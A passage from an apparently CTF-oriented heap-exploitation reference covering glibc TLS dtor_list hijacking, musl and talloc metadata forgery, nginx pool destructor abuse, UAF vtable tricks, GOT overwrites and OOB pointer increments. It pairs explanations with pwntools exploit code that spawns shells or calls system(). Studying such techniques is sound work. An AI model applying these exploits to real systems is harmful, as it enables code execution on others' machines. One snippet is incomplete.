payload += p32(0)                    # next chunk's size field (prev_in_use = 0)
```

**Key insight:** Custom allocators almost never implement glibc's `fd->bk == chunk && bk->fd == chunk` safe-unlink check introduced in 2004. The classic `write-what-where` via `unlink(chunk)` applies verbatim — target GOT entries that will be called soon (printf, free, puts) and bake a short `jmp +8` over the 8-byte write slot into the shellcode. Validate the faked `size` field of the sentinel chunk so the allocator still consolidates instead of aborting.

---

## TLS dtor_list Hijack for Code Execution After Exit

**When to use:** glibc 2.35+ with no `__free_hook`/`__malloc_hook`, seccomp blocking direct execve, heap overflow primitive available, need code execution via `exit()` path.

**Full chain:** Heap overflow → overlap chunks for libc/heap leak → tcache poisoning twice (first to erase fs:0x30 random value, second to write fake dtor_list in TLS) → stack pivot gadget → open/read/write ROP for flag exfiltration.

**TLS structure overview:**
- TLS (Thread Local Storage) stores thread-specific data, including dtor lists
- `dtor_list` is an array of destructor functions called on thread exit
- Located in TLS storage, address relative to fs segment register
- `fs:0x30` stores a random value used to mangle heap pointers (safe-linking)

**Exploitation steps:**

1. **Leak libc and heap bases:**
   - Create overlapping chunks using backward consolidation
   - Free chunk to place libc pointers in unsorted bin
   - Allocate overlapping region to read libc fd/bk pointers
   - Use unsorted bin attack or view operation to leak

2. **Setup tcache for poisoning:**
   - Fill tcache bins with chunks
   - Create large chunk (>0x420) to force sorting into smallbins
   - Double-free chunks into tcache (bypassing fastbin dup checks)

3. **First tcache poisoning — erase random value:**
   - Poison tcache fd to point to `libc_address - 0x2890` (near fs:0x30)
   - Allocate to get write primitive near TLS
   - Overwrite fs:0x30 with controlled value (0) to disable safe-linking

4. **Second tcache poisoning — write fake dtor_list:**
   - Poison tcache fd to point to `libc_address - 0x2920` (TLS dtor area)
   - Allocate to get write primitive in TLS storage
   - Write fake dtor_list structure with stack pivot gadget

5. **Fake dtor_list structure:**
   ```python
   # dtor_list entry format:
   # [func_ptr, obj_ptr] where func_ptr(obj_ptr) is called on exit
   fake_dtor = flat([
       0,                          # obj_ptr (dummy)
       pivot_gadget,               # func_ptr = mov rsp, rdx; ret
       0xdeadbeef,                 # first arg (dummy)
       0,                          # second arg
       0,                          # third arg
       0,                          # fourth arg
       rop_addr                    # rdx value → new stack pointer
   ])
   ```

6. **Stack pivot and ROP execution:**
   - Use `mov rsp, rdx; ret` gadget to switch stack to controlled ROP chain
   - Build ROP chain for open/read/write operations (seccomp-compatible)
   - `exit()` triggers `_dl_fini()` → calls dtor functions → pivots to ROP

**Key gadgets:**
- Stack pivot: `mov rsp, rdx; ret` (found in libc, sets RSP to RDX value)
- Safe-linking mangle: `ptr ^ (heap_addr >> 12)`
- dtor_list location: `libc_base - 0x2890` (glibc 2.35 specific offset)

**Code example:**
```python
# After leak, calculate addresses
libc.address = leak - 0x219ce0  # Example offset
heap = leak - 0xe00
mangle = lambda ptr: ptr ^ (heap >> 12)

# First poisoning: erase fs:0x30
payload = b'A' * 0xf8
payload += flat(0x81)
payload += b'@' * 0x78
# ... setup overlapping chunks ...
e(7, over1)  # Write mangled pointer to libc-0x2890

# Second poisoning: write dtor_list
fake = b''
fake += p64(0) + p64(libc.address - 0x2900) + p64(0)*2
fake += p64(rol(pivot_gadget, 0x11, 64))  # Mangled pivot
fake += p64(0xdeadbeef)
fake += p64(rop_addr)  # RDX for pivot
a(0x48, fake)

# Trigger via exit
r.sendlineafter(b'mand: ', b'5')
```

**Requirements:**
- Heap overflow for arbitrary writes
- Ability to create overlapping chunks
- tcache poisoning primitive
- Seccomp allowing open/read/write but not execve
- libc 2.35+ (TLS dtor_list layout)

**Key insight:** TLS storage provides writable memory for forging exit-time execution. By erasing the safe-linking random value, heap operations become deterministic. The dtor_list hijack enables code execution without direct function calls, bypassing some mitigations.

---

## musl libc Heap Exploitation — Meta Pointer + atexit

**Pattern:** Binary linked against musl libc (not glibc). musl's allocator uses `meta` structures instead of chunk headers. OOB read leaks `meta->mem` pointer; arbitrary write redirects allocation to controlled address.

**musl allocator layout:**
- Each allocation belongs to a `group`, managed by a `meta` struct
- `meta->mem` points to the group's data region
- First `0x70`-class allocation places `meta0->mem` at a fixed offset from PIE base (e.g., `chall_base + 0x3f20`)

**Exploitation chain:**
1. **Leak meta pointer** — OOB read at offset `0x80` from a heap allocation reads the `meta` struct pointer
2. **Recover PIE base** — `meta0->mem` is at a fixed offset from the binary base
3. **Redirect allocation** — Overwrite `meta->mem` to point at a live group or target address. Next allocation from that group returns attacker-controlled memory
4. **atexit hijack** — Overwrite musl's `atexit` handler list with `system("cat flag")`. Normal program exit triggers code execution

```python
# Leak meta pointer via OOB read
meta_ptr = leak_at_offset(0x80)
pie_base = meta_ptr - 0x3f20  # fixed offset for first 0x70 allocation

# Rewrite meta->mem to redirect future allocations
write_at

# Next alloc returns target_addr — use to overwrite atexit handlers
alloc_and_write(atexit_list_addr, system_addr, "cat flag")
```

**Key insight:** musl's allocator metadata is stored separately from heap data, but predictable offsets link them to the binary base. Unlike glibc, musl has no safe-linking or tcache — corrupting `meta->mem` gives direct allocation control. The `atexit` handler list is a simpler code execution target than glibc's `__free_hook` (which is removed in 2.34+).

**Detection:** Binary uses musl libc (check `ldd`, or `strings binary | grep musl`). Menu-style heap challenges with read/write primitives.

---

## Custom Allocator Exploitation

Applications may use custom allocators (nginx pools, Apache apr, game engines):

**nginx pool structure:**
- Pools chain allocations with destructor callbacks
- `ngx_destroy_pool()` iterates cleanup handlers
- Overflow to overwrite destructor function pointer + argument
- When pool freed, calls `system(controlled_string)`

**General approach:**
1. Reverse engineer allocator metadata layout
2. Find destructor/callback pointers in structures
3. Overflow to corrupt pointer + first argument
4. Trigger deallocation to call controlled function

```python
# nginx pool exploit pattern
payload = flat({
    0x00: cmd * (0x800 // len(cmd)),      # Command string
    0x800: [libc.sym.system, HEAP + OFF] * 0x80,  # Destructor spray
    0x1010: [0x1020, 0x1011],              # Pool metadata
    0x1010+0x50: [HEAP + OFF + 0x800]      # Cleanup handler ptr
}, length=0x1200)
```

### talloc Pool Header Forgery for Arbitrary Read/Write

**Pattern:** talloc is a hierarchical memory allocator (used in Samba, CUPS, etc.). Forge fake pool headers with controlled fields to redirect allocations to arbitrary addresses.

```c
// talloc pool header fields: end, object_count, hdr_fill
// followed by talloc_chunk: next, prev, parent, child, refs, name, size, flags, pool
// Set pool boundaries to span target address
// Next allocation returns attacker-controlled address
// Read GOT for libc leak, write __free_hook with system()
```

**Exploitation steps:**
1. Leak heap address through application data
2. Forge talloc pool header with `end` pointing past target address
3. Next `talloc()` call returns memory at attacker-chosen location
4. Use arbitrary read (GOT) for libc leak, arbitrary write for hook overwrite

**Key insight:** Custom allocator pool metadata controls where future allocations land. When applications use talloc, pool header forgery provides arbitrary memory placement. The hierarchical parent/child structure means corrupting one header cascades through the allocation tree.

---

## UAF Vtable Pointer Encoding Shell Argument

**Pattern:** After UAF, heap spray fills memory with `system()` addresses at a 3-byte offset. The vtable pointer address `0x??006873` encodes ASCII `"sh\x00"` at the object start, so calling `system()` through the vtable executes `system("sh")`.

```python
from pwn import *

# Heap spray: fill 16MB with system() address at offset +3
# Each spray chunk: 3 bytes padding + 8 bytes system_addr, repeated
spray_unit = b"\x00" * 3 + p64(system_addr)
spray_data = spray_unit * (0x1000000 // len(spray_unit))

# Trigger heap spray via application interface
for i in range(spray_count):
    alloc(spray_data[:chunk_size])

# UAF object at address 0xXX006873
# Bytes at object start: 73 68 00 XX = "sh\x00..."
# When vtable call dispatches: system(this) → system("sh")

# Trigger: free the target object, then invoke its virtual method
free(target_obj)
trigger_vtable_call(target_obj)  # calls system("sh")
```

**Key insight:** The vtable pointer value itself serves as the string argument to `system()`. By arranging the heap spray so objects land at addresses containing `0x6873` (ASCII "sh") in the low bytes, the object's address doubles as a valid shell command string. This eliminates the need for a separate controlled string — the pointer IS the argument.

**When to recognize:** UAF on a C++ object with virtual methods, where you control heap layout but not the exact content at the object's `this` pointer. If `system()` is called with `this` as the first argument (common in vtable dispatch), the object's address just needs to decode as a valid command string.

---

## Uninitialized Chunk Residue Pointer Leak

**Pattern:** A contact manager allocates a struct `{name, bio}` on the heap but only writes `name`, leaving `bio` uninitialized. After a delete-then-create cycle the new allocation reuses a chunk that still holds a stale pointer from a previous contact. The application's `print_contact()` dereferences `bio`, turning the leftover allocator residue into a controlled heap/libc read.

```c
struct contact { char *name; char *bio; };    // bio never zeroed

void create() {
    struct contact *c = malloc(sizeof *c);
    c->name = malloc(NAME_SZ);
    read_line(c->name, NAME_SZ);
    // bio left uninitialized!
}

void print(struct contact *c) { puts(c->bio); }   // leaks stale pointer target
```

```python
from pwn import *
io = process("./contacts")

# 1. Prime the heap: create a contact whose name chunk will later be reused
#    as the struct for the next contact.
io.sendline("create");  io.sendline("A" * 0x18)
io.sendline("delete 0")

# 2. Create a new contact — it grabs the previously freed chunk. The old
#    name bytes now live in the struct's `bio` field.
io.sendline("create");  io.sendline("B" * 0x10)

# 3. Print → leaks the residue as if it were a bio string.
io.sendline("print 0")
leak = u64(io.recvline().ljust(8, b"\x00"))
log.success(f"heap leak: {leak:#x}")
```

**Key insight:** Uninitialized fields are write-what-where primitives in reverse — the attacker does not choose *what* the field holds but can *place* chunks so that useful bytes end up in it. Target any struct field that is (a) read later without being written and (b) subject to chunk reuse. Common culprits: manually-written `malloc` + `read_line` pairs, C++ classes with members that skip initialisation in non-default constructors, and zero-allocated-then-partially-written caches.

---

## Adjacent-Struct fn-Pointer Overflow for Libc Leak + GOT Overwrite

**Pattern:** Go binary compiled with `cgo` places a name buffer immediately adjacent to a struct whose first field is a function pointer (C-style vtable). Overflowing the name field corrupts the next struct's function pointer. First overwrite → redirect the call to `puts(got['free'])` to leak libc. Second overwrite → point free's GOT entry at `system`, then free a chunk whose contents are `"/bin/sh"`.

```python
# 1. Leak libc
payload = b'A'*name_size + p64(puts_plt) + p64(pop_rdi_ret) + p64(free_got)
io.send(payload); io.recvuntil(b'name: '); libc = u64(io.recv(6).ljust(8, b'\x00'))

# 2. Overwrite free@GOT with system
libc_base = libc - libc_syms['puts']
io.send(b'A'*name_size + p64(libc_base + libc_syms['system']))

# 3. Free a chunk whose contents are "/bin/sh\x00"
io.sendline('/bin/sh')
io.sendline('delete 0')
```

**Key insight:** cgo binaries often have C-style structs next to Go-allocated buffers, so classic C-heap techniques still work against Go servers. Look for `GoString` + `char*` + function pointer patterns in the decompile; the layout is usually deterministic.

---

## 6-Bit Index OOB + written_bytes Accumulator for Fn-Pointer Increment

**Pattern:** C++ compressor keeps a 48-element QWORD cache (`cached_qwords[48]`) but the cache-read/write opcodes accept a 6-bit index (0-63), giving OOB access into the surrounding object (`buf`, `buf_size`, `buf_offset_Q`, `written_bytes`, `print_uncomp_fsz`). All operations are QWORD-aligned so you cannot directly slice a function pointer; instead, abuse the unused `written_bytes` counter as a programmable offset accumulator to turn `print_uncomp_fsz` into `cat_flag()`.

```python
# OOB write primitives (a2 in [0, 0x3f]):
#   cache_qword(a2, k)            -> cached_qwords[a2] = buf[buf_off_Q - k]
#   save_cached_qword_to_comp(a2) -> buf[++off] = cached_qwords[a2]; written_bytes += 8

# 1. Preallocate buf so it is not realloc'd later (avoids data loss).
# 2. Save print_uncomp_fsz into buf via OOB save_cached_qword_to_comp(0x34).
# 3. Move it back into written_bytes via OOB cache_qword(0x33, 1).
# 4. Emit 0x38 cached QWORDs -> written_bytes += 0x38*8 == 0x1c0 (offset to cat_flag).
# 5. Save the now-incremented written_bytes into buf, then OOB write it back
#    on top of print_uncomp_fsz. Trigger an error path so main() calls it.
payload += save_cached_qword_to_comp(0x34)       # fn ptr -> buf
payload += cache_qword(0x33, 1)                  # buf -> written_bytes
payload += save_cached_qword_to_comp(0) * 0x38   # written_bytes += 0x1c0
payload += save_cached_qword_to_comp(0x33)       # written_bytes -> buf
payload += cache_qword(0x34, 1)                  # buf -> print_uncomp_fsz
```

**Key insight:** When OOB writes are QWORD-aligned but the target function sits only `N*0x10` bytes from an existing pointer, look for a process-local counter in the same struct that is incremented by a known stride. Treating that counter as an arithmetic shim turns an aligned-write primitive into a byte-precise pointer increment, bypassing PIE without ever leaking a code address.
